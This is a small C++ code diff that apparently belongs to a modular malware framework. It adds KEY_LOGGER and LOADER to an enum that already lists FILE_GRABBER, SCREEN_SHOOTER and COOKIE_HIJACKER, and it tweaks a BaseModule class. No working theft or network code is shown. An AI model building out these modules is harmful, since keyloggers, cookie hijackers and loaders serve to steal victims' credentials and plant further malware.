@@ -20,6 +20,8 @@ typedef enum SupportedModules {
         FILE_GRABBER=0,
         SCREEN_SHOOTER,
         COOKIE_HIJACKER,
+        KEY_LOGGER,
+        LOADER,
         NUM_OF_MODULES
     } supported_modules_enum;
 
@@ -100,7 +102,7 @@ public:
 
     BaseModule(std::string mtype, const json & module_args) : args(module_args), module_type(mtype), run_(true) 
     {
-        if(args && args.contains("activity_id"))
+        if(args.contains("activity_id"))
         {
             activity_id = args["activity_id"];
         }
@@ -124,7 +126,7 @@ public:
         }
     }
     
-    void stop()
+    virtual void stop()
     {
         run_ = false;
     }
